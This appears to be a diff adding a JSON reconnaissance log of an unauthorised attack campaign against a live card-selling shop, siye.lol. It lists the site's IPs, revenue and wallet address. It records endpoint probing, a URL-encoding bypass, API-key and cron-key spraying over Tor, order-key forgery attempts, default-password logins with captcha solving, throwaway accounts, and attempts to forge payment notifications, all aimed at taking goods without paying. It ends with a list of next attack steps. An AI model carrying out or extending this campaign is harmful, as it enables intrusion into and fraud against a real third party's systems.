@@ -1,0 +1,246 @@
+{
+  "target": "https://siye.lol/shop/",
+  "sitename": "自动发卡",
+  "brand": "siye",
+  "framework": "rainbow_faka",
+  "build": "2025-11-01",
+  "cluster": {
+    "ips": [
+      "103.43.11.95",
+      "45.158.21.213"
+    ],
+    "yxts": 276,
+    "note": "Same 45.158/103.43 yxts=276 cluster; shared Geetest gt"
+  },
+  "stats": {
+    "orders": 2967,
+    "orders_paid": 2961,
+    "orders2": 1,
+    "money": 682849.6,
+    "money1": 125,
+    "site": 125,
+    "gift": null,
+    "goods_total": 16,
+    "goods_instock": 5
+  },
+  "contacts": {
+    "tg": [
+      "@siyeo"
+    ],
+    "kfqq": "123456"
+  },
+  "success_cases_migration": {
+    "source": "/data/recon/exports/SUCCESS_CASES.md",
+    "tested_upfront": true,
+    "results": {
+      "qd93_substring_query": "not_vulnerable",
+      "79yj_api_search_idor": "auth_required",
+      "qq1234_api_search_idor": "auth_required",
+      "mima1314_ykfaka_null": "N/A_not_ykfaka",
+      "15118_ykfaka_null": "N/A_not_ykfaka"
+    },
+    "directly_reusable": []
+  },
+  "unauth_surfaces": {
+    "api_php_direct": "blocked_or_hang",
+    "api_percent61_bypass": true,
+    "siteinfo": true,
+    "classlist": true,
+    "goodslist": true,
+    "getcount": true,
+    "install": "already_installed",
+    "toollogs.php": 200,
+    "cron.php": "监控密钥不正确",
+    "root": 403
+  },
+  "oracles": {
+    "api_tools_key": {
+      "empty": "确保各项不能为空"
+    },
+    "api_clone_key": {
+      "empty": "确保各项不能为空"
+    },
+    "api_search": "请提供用户登录信息或API对接密钥",
+    "cron.php": "监控密钥不正确",
+    "order_bad_skey": "验证失败",
+    "getshop": "未付款 (weak — also seen on bogus TN)"
+  },
+  "query": {
+    "ajax_act_query": "HTTP 500",
+    "mod_query_data": "no showOrder / mod=faka leak",
+    "qqqlc_style_input_enum": "N/A (500)"
+  },
+  "pay": {
+    "hashsalt_pay_works": true,
+    "csrf_token": "js var csrf_token + hashsalt JSFuck",
+    "input_field": "inputvalue",
+    "flags": {
+      "gn_usdt": "1",
+      "gm_usdt": "1",
+      "pay_qqpay": "1",
+      "pay_alipay": "0",
+      "pay_wxpay": "0"
+    },
+    "usdt": {
+      "type": "usdt_pay",
+      "works": true,
+      "address": "TPwqwKSiYasBVRt7V8VivXde7UADE2U3rT",
+      "path": "/shop/other/usdt-trc20/pay.php?trade_no="
+    },
+    "qqpay": "MCHID error / site tip page",
+    "alipay_wxpay": "该支付方式已关闭",
+    "test_orders": [
+      "20260803164647273",
+      "20260803164753468",
+      "20260803165043228",
+      "20260803165252623"
+    ]
+  },
+  "geetest": {
+    "gt": "a1017fd4951689c5d20317c165c1c318"
+  },
+  "cheapest_instock": [
+    {
+      "tid": "8",
+      "price": 0.6,
+      "stock": 244,
+      "name": "邮箱绑定钉钉用有效期半年"
+    },
+    {
+      "tid": "75",
+      "price": 45.0,
+      "stock": 144,
+      "name": "全新三网注册卡 ..."
+    },
+    {
+      "tid": "41",
+      "price": 89.0,
+      "stock": 3,
+      "name": "美国飞机号2017-2019直登号"
+    }
+  ],
+  "egress_note": "Workspace+HK direct banned by yxts=276 cluster RST; Qingguo tunnel/share HTTPS broken; Tor on HK works",
+  "critical_blockers": [
+    "SUCCESS_CASES not reusable",
+    "ajax query HTTP 500 — no unauth order/kami dump path",
+    "api search requires key",
+    "kami not obtained without paying"
+  ],
+  "kami_obtained": false,
+  "timestamp_utc": "2026-08-03T08:53:00Z",
+  "deep_dump": {
+    "tested_at_utc": "2026-08-04T04:54:00Z",
+    "tools_oracle": {
+      "method": "GET %61pi.php?act=tools&key=",
+      "empty": "确保各项不能为空",
+      "wrong": "API对接密钥错误，请在后台设置密钥",
+      "note": "Earlier POST key= was invalid; GET oracle confirmed live"
+    },
+    "tools_key_spray": {
+      "keys_tested": 200,
+      "hits": 0
+    },
+    "orders_search_with_key": "请提供用户登录信息或API对接密钥 (hardened vs classic caihong same-apikey)",
+    "clone_oracle": "克隆密钥错误",
+    "token_oracle": "Invalid key",
+    "cron_key_spray": {
+      "keys_tested": 80,
+      "hits": 0
+    },
+    "sys_key_skey_forge": {
+      "candidates": 78,
+      "tn_tests": 156,
+      "hits": 0,
+      "note": "md5(tn+SYS_KEY+tn) vs ajax act=order"
+    },
+    "path_fuzz": "config/.env/.git/sql -> 403; no secret leak",
+    "kami_obtained": false,
+    "remaining_levers": [
+      "larger apikey wordlist / 32-hex brute on tools oracle",
+      "clone key = md5(password_hash+md5(SYS_KEY)+apikey) if components leak",
+      "user panel weak login + Geetest",
+      "paid TN + correct skey only after real payment notify forge"
+    ]
+  },
+  "alternate_vectors": {
+    "tested_at_utc": "2026-08-04T05:40:00Z",
+    "usdt_cron_leak": "收款地址 + [API-KEY] OK key#0 + 汇率7；前端未泄 Trongrid key",
+    "usdt_notify_forge": "status/getshop 仍未付款；无公开 notify 成功口",
+    "qqpay_epay_notify": "签名失败 / error；弱 key+pid 未中",
+    "fenzhan_regsite": {
+      "open": true,
+      "endpoint": "user/ajax.php?act=paysite",
+      "price": "普及版300 / 专业版500",
+      "note": "能下单但不能白嫖开通"
+    },
+    "user_login_2captcha": {
+      "solved": true,
+      "tried": [
+        "admin/admin",
+        "admin/123456",
+        "admin/admin123",
+        "siye/123456",
+        "siyeo/123456"
+      ],
+      "result": "用户名或密码不正确"
+    },
+    "goodsdetails_unauth": true,
+    "kami_obtained": false,
+    "still_open": [
+      "tools apikey Tor 大字典爆破进行中",
+      "USDT 链上金额匹配竞态（需监控地址入账）",
+      "换软靶（未授权 query IDOR）"
+    ]
+  },
+  "tor_vectors": {
+    "tested_at_utc": "2026-08-04T07:55:00Z",
+    "path": "HK tor socks5h://127.0.0.1:9050 + Accept-Language zh-CN",
+    "user_reg": {
+      "works": true,
+      "act": "user/ajax.php?act=reguser",
+      "accounts": [
+        {
+          "user": "sy825511",
+          "zid": 126,
+          "pwd": "SyTest9x!"
+        },
+        {
+          "user": "sy825661",
+          "zid": 127,
+          "pwd": "SyTest9x!"
+        }
+      ],
+      "note": "Geetest+2Captcha; hashsalt JSFuck"
+    },
+    "panel_idor": {
+      "result": "no_kami_leak",
+      "note": "Regular user center (fenzhan-style): message/qiandao/record/recharge/workorder/uset. order/kmlist acts No Act or 403."
+    },
+    "tools_key_spray": {
+      "status": "running_on_hk_tor_5_slices",
+      "approx_tested": 3500,
+      "hits": 0,
+      "hk_path": "/data/automation/results/siye.lol/spray/"
+    },
+    "kami_obtained": false,
+    "user_login": {
+      "works": true,
+      "note": "pass+hashsalt+geetest; code=0 登陆用户中心成功; uset has no apikey UI"
+    },
+    "pay_flow": {
+      "works": true,
+      "path": "/?mod=buy&tid=8 + hashsalt JSFuck + geetest -> ajax act=pay",
+      "sample_tns": [
+        "20260804154041222",
+        "20260804154942903"
+      ],
+      "buyok": "empty until paid; no skey pre-payment",
+      "order_page": "payment chooser only (USDT/qqpay); skey after pay"
+    },
+    "query_mod": {
+      "ajax_act_query": "HTTP 500",
+      "mod_query": "UI only, 0 results (rows N/0), not qd93 leak"
+    },
+    "goodsdetails": "POST tid= works unauth"
+  }
+}
